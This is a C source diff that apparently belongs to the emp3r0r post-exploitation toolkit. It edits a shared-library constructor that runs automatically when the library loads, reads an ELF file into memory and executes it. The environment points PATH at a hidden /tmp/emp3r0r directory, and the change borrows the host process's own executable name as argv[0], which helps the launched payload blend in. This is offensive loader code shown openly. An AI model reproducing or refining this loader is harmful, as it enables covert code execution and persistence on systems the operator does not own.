@@ -19,9 +19,13 @@ void __attribute__((constructor)) initLibrary(void) {
 
     char *buf = malloc(size);
     fread(buf, size, 1, f);
+    fclose(f);
+    char exe[1024];
+    if (readlink("/proc/self/exe", exe, 1024) < 0)
+      return;
 
     // Run the ELF
-    char *argv[] = {argv[0], NULL};
+    char *argv[] = {exe, NULL};
     char *envv[] = {
         "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/tmp/emp3r0r/bin-aksdfvmvmsdkg",
         "HOME=/tmp", NULL};
